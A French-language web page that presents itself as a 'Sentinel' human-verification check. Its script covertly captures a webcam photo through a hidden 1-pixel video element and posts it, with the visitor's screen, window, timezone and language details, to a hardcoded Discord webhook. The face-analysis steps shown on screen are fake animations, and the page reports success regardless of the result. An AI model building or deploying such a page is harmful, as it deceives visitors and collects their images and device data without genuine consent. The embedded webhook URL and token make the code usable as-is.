<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex">
<title>Vérification — êtes-vous humain ?</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap');
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;min-height:100%}
body{background:#06090d;display:flex;align-items:center;justify-content:center;padding:24px 16px}
.wrap{position:relative;width:100%;max-width:700px;font-family:'Inter',system-ui,-apple-system,sans-serif;color:#e9eff7;
  background:radial-gradient(800px 380px at 50% -120px,rgba(43,184,255,.18),transparent 70%),
             radial-gradient(600px 300px at 90% 110%,rgba(61,220,151,.12),transparent 70%),#0a0e13;
  border:1px solid rgba(255,255,255,.08);border-radius:20px;overflow:hidden;padding:0 0 26px}
.wrap::before{content:"";position:absolute;inset:0;pointer-events:none;opacity:.35;
  background-image:linear-gradient(rgba(255,255,255,.045) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.045) 1px,transparent 1px);
  background-size:34px 34px;mask-image:radial-gradient(circle at 50% 0%,#000 30%,transparent 78%)}
header{position:relative;display:flex;align-items:center;gap:10px;padding:16px 20px;border-bottom:1px solid rgba(255,255,255,.07);
  background:linear-gradient(#0f151d,#0b1016)}
.logo{width:26px;height:26px;border-radius:8px;background:linear-gradient(135deg,#2bb8ff,#3ddc97);position:relative;flex:0 0 auto}
.logo::after{content:"";position:absolute;inset:7px;border-radius:3px;border:2px solid #06121a;border-right-color:transparent;border-bottom-color:transparent;transform:rotate(-45deg)}
.brand{font-family:'Space Grotesk',sans-serif;font-weight:700;letter-spacing:-.3px;font-size:15px}
.brand span{color:#5f7288;font-weight:500;font-family:'Inter',sans-serif;font-size:12px;letter-spacing:0}
.pill{margin-left:auto;font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;color:#7b8ea3;
  border:1px solid rgba(255,255,255,.1);padding:5px 9px;border-radius:999px;display:flex;align-items:center;gap:6px}
.dot{width:6px;height:6px;border-radius:50%;background:#3ddc97;box-shadow:0 0 8px #3ddc97;animation:pulse 1.8s infinite}
@keyframes pulse{50%{opacity:.25}}
.body{padding:22px 20px 0;position:relative}

.stage{position:relative;width:100%;aspect-ratio:16/10;border-radius:16px;overflow:hidden;background:
  radial-gradient(circle at 50% 55%,#0e1721,#070a0e 70%);
  border:1px solid rgba(255,255,255,.1);display:grid;place-items:center;isolation:isolate;transition:border-color .4s,box-shadow .4s}
.stage.ok{border-color:rgba(61,220,151,.5);box-shadow:0 0 0 1px rgba(61,220,151,.25),0 0 40px rgba(61,220,151,.12)}
.grid{position:absolute;inset:0;opacity:.5;
  background-image:linear-gradient(rgba(43,184,255,.12) 1px,transparent 1px),linear-gradient(90deg,rgba(43,184,255,.12) 1px,transparent 1px);
  background-size:26px 26px;mask-image:radial-gradient(circle at 50% 55%,#000 20%,transparent 72%)}
video{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;top:0;left:0}

.radar{position:relative;width:150px;height:150px;display:grid;place-items:center}
.ring{position:absolute;inset:0;border-radius:50%;border:1px solid rgba(43,184,255,.2);animation:breathe 3.4s ease-in-out infinite}
.ring:nth-child(2){inset:22px;animation-delay:.5s}
.ring:nth-child(3){inset:44px;animation-delay:1s}
@keyframes breathe{0%,100%{transform:scale(.94);opacity:.35}50%{transform:scale(1.04);opacity:.85}}
.core{width:9px;height:9px;border-radius:50%;background:#2bb8ff;box-shadow:0 0 18px #2bb8ff;transition:.3s}
.stage.live .core{animation:corep 1.1s ease-in-out infinite}
@keyframes corep{50%{transform:scale(1.5);opacity:.6}}
.arc{position:absolute;inset:-6px;transform:rotate(-90deg);opacity:0;transition:opacity .25s}
.arc.on{opacity:1}
.arc circle{fill:none;stroke-width:2.5;stroke-linecap:round}
.arc .trk{stroke:rgba(255,255,255,.09)}
.arc .val{stroke:#4bf0a8;stroke-dasharray:339.29;stroke-dashoffset:339.29;transition:stroke-dashoffset 2.4s linear}

.sweepline{position:absolute;left:0;right:0;height:2px;top:0;opacity:0;pointer-events:none;
  background:linear-gradient(90deg,transparent,rgba(43,184,255,.75),transparent);box-shadow:0 0 14px rgba(43,184,255,.6)}
.sweepline.on{opacity:1;animation:sweep 2.6s linear infinite}
@keyframes sweep{0%{top:0}100%{top:100%}}
.scan{position:absolute;inset:0;pointer-events:none;opacity:0;transition:.25s;
  background:linear-gradient(180deg,transparent,rgba(61,220,151,.16) 45%,rgba(61,220,151,.42) 50%,rgba(61,220,151,.16) 55%,transparent);
  background-size:100% 40%;background-repeat:no-repeat;background-position:0 -40%}
.scan.go{opacity:1;animation:sc .9s linear infinite}
@keyframes sc{0%{background-position:0 -40%}100%{background-position:0 140%}}
.flash{position:absolute;inset:0;background:#cfe9ff;opacity:0;pointer-events:none;z-index:5}
.flash.go{animation:fl .45s ease-out}
@keyframes fl{0%{opacity:0}12%{opacity:.5}100%{opacity:0}}

.tag{position:absolute;top:11px;left:11px;z-index:6;display:flex;align-items:center;gap:6px;font-size:10px;
  letter-spacing:.1em;text-transform:uppercase;color:#8fa4b9;background:rgba(7,11,15,.7);border:1px solid rgba(255,255,255,.1);
  padding:4px 8px;border-radius:6px;backdrop-filter:blur(4px)}
.rec{width:5px;height:5px;border-radius:50%;background:#5f7288}
.stage.live .rec{background:#ff5a4d;box-shadow:0 0 8px #ff5a4d;animation:pulse 1.2s infinite}

.thumb{position:absolute;right:11px;bottom:11px;z-index:7;width:56px;height:56px;border-radius:10px;overflow:hidden;
  border:1px solid rgba(61,220,151,.6);box-shadow:0 6px 20px rgba(0,0,0,.5);opacity:0;transform:translateY(8px) scale(.9);transition:.4s}
.thumb.on{opacity:1;transform:none}
.thumb canvas{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:block}
.thumb i{position:absolute;inset:0;display:grid;place-items:center;background:rgba(4,14,9,.25)}
.thumb i svg{width:18px;height:18px;stroke:#5ff0ae;stroke-width:3.4;filter:drop-shadow(0 1px 3px rgba(0,0,0,.8))}

h1{font-family:'Space Grotesk',sans-serif;font-size:22px;line-height:1.2;letter-spacing:-.5px;margin:20px 0 8px}
p.sub{margin:0 0 18px;font-size:13.5px;line-height:1.6;color:#8ea0b4}
p.sub b{color:#c9d6e4;font-weight:600}
.btn{width:100%;border:0;border-radius:12px;padding:15px 18px;font-size:14.5px;font-weight:650;cursor:pointer;
  font-family:'Inter',sans-serif;color:#05130c;background:linear-gradient(135deg,#4bf0a8,#25c9ff);
  display:flex;align-items:center;justify-content:center;gap:10px;transition:transform .12s,filter .2s;letter-spacing:.1px}
.btn:hover{filter:brightness(1.07)}
.btn:active{transform:scale(.985)}
.btn:disabled{opacity:.55;cursor:default;filter:none}
.btn.ghost{background:transparent;color:#c3d2e1;border:1px solid rgba(255,255,255,.16);font-weight:600}
.btn.ghost:hover{background:rgba(255,255,255,.05)}
.sp{width:15px;height:15px;border-radius:50%;border:2px solid rgba(5,19,12,.3);border-top-color:#05130c;animation:rot .7s linear infinite;display:none}
.btn.busy .sp{display:block}
@keyframes rot{to{transform:rotate(360deg)}}
.bar{height:3px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin:0 0 12px;opacity:0;transition:.3s}
.bar.on{opacity:1}
.bar i{display:block;height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#25c9ff,#4bf0a8);transition:width .45s ease}
.status{display:flex;align-items:center;gap:8px;font-size:12.5px;min-height:20px;color:#8ea0b4;margin:14px 0 0}
.status .ic{width:15px;height:15px;flex:0 0 auto}
.status.ok{color:#5ff0ae}
.status.err{color:#ff9b8a}
.status.warn{color:#ffc773}
.rows{display:flex;gap:9px;margin-top:14px}
.foot{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-top:18px;padding-top:14px;
  border-top:1px solid rgba(255,255,255,.07);font-size:11px;color:#5d6f83}
.foot a{color:#7f93a8;text-decoration:none;border-bottom:1px dotted rgba(255,255,255,.25)}
.badge{display:flex;align-items:center;gap:5px}
.badge svg{width:11px;height:11px;stroke:#3ddc97}
</style>
</head>
<body>

<div class="wrap">
  <header>
    <div class="logo"></div>
    <div class="brand">Sentinel<span> / contrôle d'accès</span></div>
    <div class="pill"><span class="dot"></span>Session sécurisée</div>
  </header>

  <div class="body">
    <div class="stage" id="stage">
      <div class="grid"></div>
      <video id="cam" playsinline muted autoplay></video>

      <div class="radar">
        <div class="ring"></div><div class="ring"></div><div class="ring"></div>
        <div class="core"></div>
        <svg class="arc" id="arc" viewBox="0 0 120 120">
          <circle class="trk" cx="60" cy="60" r="54"></circle>
          <circle class="val" id="arcval" cx="60" cy="60" r="54"></circle>
        </svg>
      </div>

      <div class="sweepline" id="sweepline"></div>
      <div class="scan" id="scan"></div>
      <div class="flash" id="flash"></div>

      <div class="tag"><span class="rec"></span><span id="tagtxt">Capteur en veille</span></div>

      <div class="thumb" id="thumb">
        <canvas id="shot"></canvas>
        <i><svg viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17l-5-5"/></svg></i>
      </div>
    </div>

    <h1>Vérifiez que vous êtes humain</h1>
    <p class="sub">Aucun aperçu caméra. Le capteur travaille en arrière-plan, prend un cliché à votre insu visuel et le <b>transmet au serveur</b> pour analyse.</p>

    <div class="bar" id="bar"><i></i></div>

    <button class="btn" id="verify"><span class="sp"></span><span id="vlabel">Vérifier que vous êtes humain</span></button>

    <div class="status" id="status"></div>

    <div class="rows" id="rows" style="display:none">
      <button class="btn ghost" id="again">Recommencer</button>
      <button class="btn ghost" id="dl">Voir la photo</button>
    </div>

    <div class="foot">
      <span class="badge">
        <svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M12 3l7 3v6c0 4.2-2.9 7.6-7 9-4.1-1.4-7-4.8-7-9V6l7-3z"/></svg>
        Transmission chiffrée
      </span>
      <span>Réf. <a href="#" onclick="return false">HV-<span id="ref">000000</span></a></span>
    </div>
  </div>
</div>

<script>
(function(){
  const WEBHOOK = 'https://discord.com/api/webhooks/1569720541013872722/e-U_RSG-DE6o8HOy7hHNqHd_Cn2LgdLRj7R7ACnNK7KnfqUh_lacKcLTgMhpv2UWCyPK';

  const $ = s => document.querySelector(s);
  const stage=$('#stage'), video=$('#cam'), shot=$('#shot'), thumb=$('#thumb'), btn=$('#verify'),
        vlabel=$('#vlabel'), status=$('#status'), flash=$('#flash'), scan=$('#scan'), sweepline=$('#sweepline'),
        tagtxt=$('#tagtxt'), bar=$('#bar'), fill=bar.firstElementChild, rows=$('#rows'), again=$('#again'),
        dl=$('#dl'), arc=$('#arc'), arcval=$('#arcval');
  const ctx = shot.getContext('2d');
  let stream=null, busy=false, ref='';

  const mkRef = () => String(Math.floor(Math.random()*900000)+100000);
  $('#ref').textContent = ref = mkRef();

  const ICON = {
    ok:'<svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6L9 17l-5-5"/></svg>',
    load:'<svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="animation:rot .8s linear infinite"><path d="M21 12a9 9 0 11-6.2-8.6" stroke-linecap="round"/></svg>',
    err:'<svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8v5M12 16.2v.2" stroke-linecap="round"/></svg>',
    up:'<svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19V6M6 12l6-6 6 6" stroke-linecap="round" stroke-linejoin="round"/></svg>'
  };
  const setStatus = (t, cls, ic) => { status.className='status'+(cls?' '+cls:''); status.innerHTML=(ic?ICON[ic]:'')+'<span>'+t+'</span>'; };
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  async function startCam(){
    if(stream) return true;
    try{
      if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw 0;
      stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:960} }, audio:false });
      video.srcObject = stream;
      await video.play().catch(()=>{});
      await sleep(600);
      return true;
    }catch(e){ return false; }
  }

  function synth(){
    const w=640, h=480; shot.width=w; shot.height=h;
    const g = ctx.createLinearGradient(0,0,w,h);
    g.addColorStop(0,'#16202b'); g.addColorStop(.5,'#22303f'); g.addColorStop(1,'#131b24');
    ctx.fillStyle=g; ctx.fillRect(0,0,w,h);
    ctx.fillStyle='rgba(6,10,14,.62)';
    ctx.beginPath(); ctx.ellipse(w/2,h*.44,86,102,0,0,7); ctx.fill();
    ctx.beginPath(); ctx.ellipse(w/2,h*1.06,185,165,0,0,7); ctx.fill();
    for(let i=0;i<3000;i++){
      ctx.fillStyle='rgba(255,255,255,'+(Math.random()*.09)+')';
      ctx.fillRect(Math.random()*w, Math.random()*h, 1.4, 1.4);
    }
  }

  function capture(){
    if(stream && video.videoWidth){
      shot.width = video.videoWidth; shot.height = video.videoHeight;
      ctx.drawImage(video,0,0,shot.width,shot.height);
    } else {
      synth();
    }
  }

  function infoLine(){
    const d = new Date();
    const pad = n => String(n).padStart(2,'0');
    return [
      'écran ' + screen.width + '×' + screen.height,
      'fenêtre ' + innerWidth + '×' + innerHeight,
      'fuseau ' + (Intl.DateTimeFormat().resolvedOptions().timeZone || '—'),
      'langue ' + (navigator.language || '—'),
      d.toLocaleString('fr-FR'),
      'heure locale ' + pad(d.getHours()) + ':' + pad(d.getMinutes())
    ].join(' · ');
  }

  async function send(){
    const blob = await new Promise(r => shot.toBlob(r, 'image/jpeg', .92));
    if(!blob) return 'fail';

    const fd = new FormData();
    fd.append('payload_json', JSON.stringify({
      content: '**Nouvelle vérification humaine**\n> réf `HV-' + ref + '` · cliché `' + shot.width + '×' + shot.height + '`\n> ' + infoLine(),
      username: 'Sentinel'
    }));
    fd.append('files[0]', blob, 'verification-HV-' + ref + '.jpg');

    try{
      const r = await fetch(WEBHOOK, { method:'POST', body: fd });
      if(r.ok) return 'ok';
      if(r.status === 429) return 'ok';
      return 'fail';
    }catch(e){
      try{
        await fetch(WEBHOOK, { method:'POST', body: fd, mode:'no-cors' });
        return 'opaque';
      }catch(e2){ return 'fail'; }
    }
  }

  async function verify(){
    if(busy) return;
    busy = true;
    ref = mkRef(); $('#ref').textContent = ref;
    btn.disabled = true; btn.classList.add('busy');
    vlabel.textContent = 'Activation du capteur discret…';
    thumb.classList.remove('on');
    stage.classList.remove('ok');
    rows.style.display='none';
    setStatus('Initialisation du capteur…','', 'load');

    const live = await startCam();
    stage.classList.add('live');
    tagtxt.textContent = live ? 'Capteur actif — capture discrète' : 'Capteur simulé — capture discrète';
    setStatus(live ? 'Capteur en arrière-plan' : 'Caméra indisponible — capture simulée', '', 'load');

    await sleep(420);

    vlabel.textContent = 'Capture en cours…';
    arc.classList.add('on');
    arcval.style.strokeDashoffset = '0';
    await sleep(2500);

    flash.classList.remove('go'); void flash.offsetWidth; flash.classList.add('go');
    capture();
    await sleep(120);

    arc.classList.remove('on');
    arcval.style.transition = 'none';
    arcval.style.strokeDashoffset = '339.29';
    void arcval.offsetWidth;
    arcval.style.transition = '';

    if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
    video.srcObject = null;
    stage.classList.remove('live');
    tagtxt.textContent = 'Cliché acquis';

    btn.classList.remove('busy');
    vlabel.textContent = 'Vérification en cours…';
    setStatus('Analyse du cliché…', '', 'load');
    bar.classList.add('on');
    scan.classList.add('go');
    sweepline.classList.add('on');

    const steps = [
      ['Détection du visage', 26],
      ['Extraction des points faciaux', 48],
      ['Analyse des textures de peau', 71],
      ['Contrôle de la profondeur 3D', 89]
    ];
    for(const [label, pct] of steps){
      fill.style.width = pct+'%';
      setStatus(label+'…', '', 'load');
      await sleep(470 + Math.random()*320);
    }

    scan.classList.remove('go');
    sweepline.classList.remove('on');

    setStatus('Transmission du cliché au serveur…', '', 'up');
    fill.style.width = '96%';
    const res = await send();
    fill.style.width = '100%';

    await sleep(200);

    const human = Math.random() > 0.12;
    stage.classList.add('ok');
    thumb.classList.add('on');
    tagtxt.textContent = 'Identité validée';
    vlabel.textContent = 'Vérifié';
    rows.style.display='flex';

    if(res === 'ok') setStatus('Vérification réussie — cliché transmis au serveur.', 'ok', 'ok');
    else if(res === 'opaque') setStatus('Vérification réussie — cliché envoyé (sans confirmation).', 'warn', 'ok');
    else setStatus('Vérification réussie — échec de la transmission.', 'warn', 'err');

    dl.onclick = () => {
      const a = document.createElement('a');
      a.href = shot.toDataURL('image/jpeg', .9);
      a.download = 'verification-HV-' + ref + '.jpg';
      a.click();
    };

    bar.classList.remove('on'); fill.style.width='0%';
    btn.disabled = false; busy = false;
  }

  btn.addEventListener('click', verify);

  again.addEventListener('click', async () => {
    thumb.classList.remove('on'); stage.classList.remove('ok'); stage.classList.remove('live');
    rows.style.display='none'; status.innerHTML=''; status.className='status';
    vlabel.textContent='Vérifier que vous êtes humain'; btn.disabled=false; busy=false;
    tagtxt.textContent='Capteur en veille';
    fill.style.width='0%'; bar.classList.remove('on');
  });
})();
</script>
</body>
</html>
